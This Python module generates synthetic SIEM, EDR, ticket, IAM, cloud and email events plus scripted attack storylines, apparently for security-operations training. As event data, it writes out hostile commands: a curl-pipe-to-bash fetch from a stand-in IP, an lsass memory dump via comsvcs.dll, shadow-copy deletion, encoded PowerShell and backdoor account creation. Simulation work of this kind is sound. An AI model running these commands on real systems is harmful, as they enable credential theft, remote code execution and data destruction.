"""Vendor-shaped raw events for each integration, plus multi-stage attack storylines.

The shapes imitate the *structure* of real products (Splunk notables, CrowdStrike detections, ServiceNow tickets, Tenable findings,
Okta system log, CloudTrail, email-security reports). They are synthetic: no real vendor API is called.
"""
from __future__ import annotations

import random
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable

from app.simulation.estate import ATTACKER_COUNTRIES, ATTACKER_IPS, Estate, Host

SOURCES = ["SIEM", "EDR", "ITSM", "Scanner", "IAM", "Cloud", "Email"]


def iso(ts: datetime | None = None) -> str:
    return (ts or datetime.now(timezone.utc)).strftime("%Y-%m-%dT%H:%M:%SZ")


def syslog(ts: str, host: str, msg: str) -> str:
    d = datetime.strptime(ts, "%Y-%m-%dT%H:%M:%SZ")
    return f"{d.strftime('%b')} {d.day:>2} {d.strftime('%H:%M:%S')} {host} {msg}"


@dataclass
class Emit:
    source: str
    raw: dict
    scenario_id: int | None = None


@dataclass
class Plan:
    name: str
    target: str
    steps: list[tuple[float, Callable[[str], Emit]]] = field(default_factory=list)  # (offset seconds at speed 1, builder(ts) -> Emit)


class Generator:
    def __init__(self, estate: Estate, rnd: random.Random, cves: list[dict]):
        self.e, self.r = estate, rnd
        self.cves = cves  # [{cve_id, cvss_score, in_kev}] from the workspace's real NVD/KEV data
        self.kev = [c for c in cves if c["in_kev"]]
        self._n = {"inc": 0, "det": 0, "evt": 0}

    # ------------------------------------------------------------------ raw event builders
    def siem(self, ts, rule, urgency, src, dest: Host, user, tech, raw_msg) -> Emit:
        return Emit("SIEM", {"_time": ts, "search_name": rule, "urgency": urgency, "src": src, "dest": dest.name, "dest_ip": dest.ip, "user": user, "mitre_technique_id": tech,
                             "_raw": syslog(ts, dest.name, raw_msg)})

    def edr(self, ts, host: Host, user, tactic, tech, filename, cmdline, severity_name) -> Emit:
        self._n["det"] += 1
        return Emit("EDR", {"detection_id": f"ldt:{self.r.getrandbits(40):010x}:{self._n['det']}", "created_timestamp": ts, "device": {"hostname": host.name, "local_ip": host.ip},
                            "username": user, "max_severity_displayname": severity_name,
                            "behaviors": [{"tactic": tactic, "technique_id": tech, "filename": filename, "cmdline": cmdline}]})

    def ticket(self, ts, number_kind, short, desc, priority, ci: Host | None, caller, cls="incident") -> Emit:
        self._n["inc"] += 1
        d = datetime.strptime(ts, "%Y-%m-%dT%H:%M:%SZ")
        prefix = {"incident": "INC", "sc_request": "REQ", "change_request": "CHG"}[cls]
        return Emit("ITSM", {"number": f"{prefix}{self.r.randint(10**6, 10**7 - 1)}", "sys_class_name": cls, "short_description": short, "description": desc, "priority": priority, "state": "New",
                             "category": number_kind, "cmdb_ci": ci.tag if ci else "", "caller_id": caller, "opened_at": d.strftime("%Y-%m-%d %H:%M:%S")})

    def finding(self, ts, host: Host, cve: dict | None = None, plugin: str | None = None, sev: str | None = None) -> Emit:
        c = cve or (self.r.choice(self.cves) if self.cves else None)
        cvss = c["cvss_score"] if c and c["cvss_score"] is not None else round(self.r.uniform(3, 8.5), 1)
        sev = sev or ("critical" if cvss >= 9 else "high" if cvss >= 7 else "medium" if cvss >= 4 else "low")
        return Emit("Scanner", {"plugin_id": self.r.randint(10000, 199999), "plugin_name": plugin or (f"Vulnerability {c['cve_id']}" if c else "Informational"), "cve": [c["cve_id"]] if c else [],
                                "asset": {"hostname": host.tag, "ipv4": host.ip}, "severity": sev, "cvss_base_score": str(cvss), "state": "OPEN", "first_found": ts, "last_found": ts})

    def iam(self, ts, event, result, user, ip, country="US", reason="", ) -> Emit:
        return Emit("IAM", {"published": ts, "eventType": event, "outcome": {"result": result, "reason": reason}, "actor": {"alternateId": f"{user}@corp.example"},
                            "client": {"ipAddress": ip, "geographicalContext": {"country": country}}, "displayMessage": event.replace(".", " ")})

    def cloud(self, ts, name, user, ip, params=None, error=None) -> Emit:
        return Emit("Cloud", {"eventTime": ts, "eventName": name, "eventSource": "cloudtrail", "userIdentity": {"userName": user}, "sourceIPAddress": ip, "awsRegion": "us-east-1",
                              "requestParameters": params or {}, **({"errorCode": error} if error else {})})

    def email(self, ts, reporter, subject, sender, verdict, urls=(), attachments=()) -> Emit:
        return Emit("Email", {"id": f"msg-{self.r.getrandbits(32):08x}", "received": ts, "reported_by": reporter, "subject": subject, "sender": sender, "verdict": verdict,
                              "urls": list(urls), "attachments": list(attachments)})

    # ------------------------------------------------------------------ background noise
    def noise(self, ts: str) -> Emit:
        r, e = self.r, self.e
        kind = r.choices(["iam_ok", "iam_fail", "siem_low", "edr_low", "scan", "ticket_req", "cloud_ok", "email_clean"], [26, 12, 14, 9, 10, 9, 12, 8])[0]
        h, u = e.pick(r), r.choice(e.users)
        if kind == "iam_ok":
            return self.iam(ts, "user.session.start", "SUCCESS", u, r.choice([x.ip for x in e.hosts] or ["10.1.1.1"]), "US")
        if kind == "iam_fail":
            return self.iam(ts, "user.session.start", "FAILURE", u, r.choice([x.ip for x in e.hosts] or ["10.1.1.2"]), "US", "INVALID_CREDENTIALS")
        if kind == "siem_low":
            rule, tech, msg = r.choice([("Port Scan From Internet Blocked", "T1046", f"firewall: DROP TCP {r.choice(ATTACKER_IPS)} -> {h.ip}:{r.choice([22, 23, 3389, 445])}"),
                                        ("Policy Violation: Unsanctioned SaaS", "", f"proxy: ALLOW {u} -> filedrop.example.net"), ("Single Failed Admin Login", "T1110", f"sshd[22]: Failed password for {u} from {h.ip} port 50212 ssh2")])
            return self.siem(ts, rule, "low" if r.random() < 0.8 else "informational", r.choice(ATTACKER_IPS), h, u, tech, msg)
        if kind == "edr_low":
            return self.edr(ts, h, u, "Execution", "T1204", "chrome_installer.exe", r.choice(["chrome_installer.exe /silent", "updater.exe --check"]), "Low")
        if kind == "scan":
            return self.finding(ts, h, plugin=None) if self.cves else self.finding(ts, h)
        if kind == "ticket_req":
            return self.ticket(ts, "Access", r.choice(["Password reset request", "Request access to shared drive", "New laptop request", "VPN token issue"]), "Routine IT request.", "4 - Low", None, u, "sc_request")
        if kind == "cloud_ok":
            return self.cloud(ts, r.choice(["DescribeInstances", "GetObject", "ListBuckets", "AssumeRole"]), u, r.choice([x.ip for x in e.hosts] or ["10.2.2.2"]))
        return self.email(ts, u, r.choice(["Quarterly newsletter", "Meeting notes", "Invoice reminder"]), "news@vendor.example", "clean")

    # ------------------------------------------------------------------ attack storylines
    def scenario(self, name: str, target: Host | None = None) -> Plan:
        fn = getattr(self, f"_sc_{name}", None)
        if fn is None:
            raise ValueError(f"unknown scenario '{name}'")
        return fn(target)

    def _sc_brute_force_takeover(self, t: Host | None) -> Plan:
        r, e = self.r, self.e
        t = t or e.pick(r, exposed=True)
        ip, user = r.choice(ATTACKER_IPS), r.choice(["root", "admin", "svc_backup", r.choice(e.users)])
        p = Plan("brute_force_takeover", t.tag)
        for i in range(14):
            p.steps.append((i * 1.5, lambda ts, i=i: self.siem(ts, "Brute Force Access Behavior Detected", "high" if i > 8 else "medium", ip, t, user, "T1110",
                                                                f"sshd[2211]: Failed password for {user} from {ip} port {40000 + i} ssh2")))
        p.steps.append((24, lambda ts: self.siem(ts, "Successful Login After Brute Force", "critical", ip, t, user, "T1078", f"sshd[2214]: Accepted password for {user} from {ip} port 40100 ssh2")))
        p.steps.append((30, lambda ts: self.edr(ts, t, user, "Execution", "T1059.001", "powershell.exe", "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "High")))
        p.steps.append((38, lambda ts: self.siem(ts, "New Local Administrator Account Created", "high", ip, t, user, "T1136", f"net user svc_update P@ssw0rd1 /add on {t.name}")))
        return p

    def _sc_phishing_to_ransomware(self, t: Host | None) -> Plan:
        r, e = self.r, self.e
        t = t or e.pick(r, exposed=False, crit=("MEDIUM", "HIGH", "CRITICAL"))
        victim, ip, country = r.choice(e.users), r.choice(ATTACKER_IPS), r.choice(ATTACKER_COUNTRIES)
        fs = e.pick(r, exposed=False, crit=("HIGH", "CRITICAL"))
        p = Plan("phishing_to_ransomware", t.tag)
        p.steps += [
            (0, lambda ts: self.email(ts, victim, "Urgent: payroll update required", "hr-payroll@c0rp-benefits.example", "malicious", ["hxxp://c0rp-benefits[.]example/login"], ["Payroll_Q3.xlsm"])),
            (8, lambda ts: self.iam(ts, "user.session.start", "SUCCESS", victim, ip, country)),
            (14, lambda ts: self.edr(ts, t, victim, "Execution", "T1204.002", "excel.exe", "EXCEL.EXE Payroll_Q3.xlsm (macro enabled) spawned cmd.exe", "Medium")),
            (20, lambda ts: self.edr(ts, t, victim, "Execution", "T1059.001", "powershell.exe", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi", "High")),
            (30, lambda ts: self.edr(ts, t, victim, "Credential Access", "T1003", "rundll32.exe", "rundll32 comsvcs.dll, MiniDump 612 C:\\\\Windows\\\\Temp\\\\l.dmp full  # lsass", "Critical")),
            (40, lambda ts: self.siem(ts, "Lateral Movement via Remote Execution", "high", t.ip, fs, victim, "T1021", f"psexec \\\\\\\\{fs.ip} -u {victim} cmd.exe from {t.ip}")),
            (52, lambda ts: self.edr(ts, fs, victim, "Impact", "T1490", "vssadmin.exe", "cmd.exe /c vssadmin delete shadows /all /quiet", "Critical")),
            (58, lambda ts: self.edr(ts, fs, "SYSTEM", "Impact", "T1486", "locker.exe", "locker.exe --encrypt D:\\\\shares --ext .locked", "Critical")),
            (66, lambda ts: self.ticket(ts, "Security", f"Files on {fs.name} renamed .locked, ransom note present", "Users cannot open documents on the file share. A note demands bitcoin.", "1 - Critical", fs, victim)),
        ]
        return p

    def _sc_kev_exploit_edge(self, t: Host | None) -> Plan:
        r, e = self.r, self.e
        t = t or e.pick(r, exposed=True)
        cve = r.choice(self.kev or self.cves) if (self.kev or self.cves) else {"cve_id": "CVE-2024-3400", "cvss_score": 10.0, "in_kev": True}
        ip = r.choice(ATTACKER_IPS)
        p = Plan("kev_exploit_edge", t.tag)
        p.steps += [
            (0, lambda ts: self.finding(ts, t, cve, sev="critical")),
            (10, lambda ts: self.siem(ts, f"IDS: Exploit Attempt {cve['cve_id']}", "high", ip, t, "", "T1190", f"suricata: ET EXPLOIT {cve['cve_id']} request from {ip} to {t.ip}:443 url=/ssl-vpn/hipreport.esp")),
            (18, lambda ts: self.siem(ts, "IDS: Exploit Attempt (repeat)", "high", ip, t, "", "T1190", f"suricata: ET EXPLOIT {cve['cve_id']} request from {ip} to {t.ip}:443")),
            (26, lambda ts: self.edr(ts, t, "root", "Execution", "T1059", "sh", "sh -c curl http://198.51.100.77/a.sh | bash", "High")),
            (34, lambda ts: self.siem(ts, "Outbound Connection To Known C2", "critical", t.ip, t, "", "T1071", f"fw: ALLOW {t.ip} -> 198.51.100.77:8443 (threat-intel match)")),
        ]
        return p

    def _sc_cloud_misconfig(self, t: Host | None) -> Plan:
        r, e = self.r, self.e
        t = t or e.pick(r)
        u, ip = r.choice(e.users), r.choice(ATTACKER_IPS)
        bucket = f"corp-{r.choice(['backups', 'customer-exports', 'finance-reports'])}"
        p = Plan("cloud_misconfig", t.tag)
        p.steps += [
            (0, lambda ts: self.cloud(ts, "PutBucketAcl", u, "10.4.4.4", {"bucketName": bucket, "AccessControlList": "AllUsers READ"})),
            (12, lambda ts: self.cloud(ts, "GetObject", "anonymous", ip, {"bucketName": bucket, "key": "export-2026-09.csv"})),
            (16, lambda ts: self.cloud(ts, "GetObject", "anonymous", ip, {"bucketName": bucket, "key": "export-2026-08.csv"})),
            (22, lambda ts: self.siem(ts, "Public Storage Bucket Accessed From Unknown IP", "high", ip, t, "anonymous", "T1530", f"cloudtrail: GetObject bucket={bucket} from {ip} user=anonymous large transfer")),
            (30, lambda ts: self.ticket(ts, "Security", f"Customer data possibly exposed in {bucket}", "Bucket ACL changed to public; external downloads observed.", "2 - High", t, u)),
        ]
        return p

    def _sc_insider_exfil(self, t: Host | None) -> Plan:
        r, e = self.r, self.e
        t = t or e.pick(r, exposed=False)
        u = r.choice(e.users)
        p = Plan("insider_exfil", t.tag)
        p.steps += [
            (0, lambda ts: self.iam(ts, "user.session.start", "SUCCESS", u, "10.9.9.9", "US")),
            (6, lambda ts: self.siem(ts, "Off-Hours VPN Access", "medium", "10.9.9.9", t, u, "T1078", f"vpn: login success user={u} from 10.9.9.9 at 02:14 local")),
            (14, lambda ts: self.siem(ts, "Mass File Access", "medium", t.ip, t, u, "T1005", f"fileserver: user={u} read 4,812 files in \\\\\\\\{t.name}\\\\finance in 90s")),
            (24, lambda ts: self.siem(ts, "DLP: Large Upload To Personal Cloud Storage", "high", t.ip, t, u, "T1567", f"dlp: user={u} uploaded 380MB to personal-drive.example.net blocked=false")),
            (32, lambda ts: self.iam(ts, "user.mfa.factor.deactivate", "SUCCESS", u, "10.9.9.9", "US")),
        ]
        return p


SCENARIOS = {
    "brute_force_takeover": "Brute force → successful login → encoded PowerShell → new admin account",
    "phishing_to_ransomware": "Phish → macro → credential dumping → lateral movement → shadow-copy deletion → encryption",
    "kev_exploit_edge": "Known-exploited CVE on an edge device → exploit attempts → reverse shell → C2",
    "cloud_misconfig": "Public bucket ACL → anonymous downloads → data-exposure ticket",
    "insider_exfil": "Off-hours VPN → mass file access → large upload to personal cloud → MFA disabled",
}
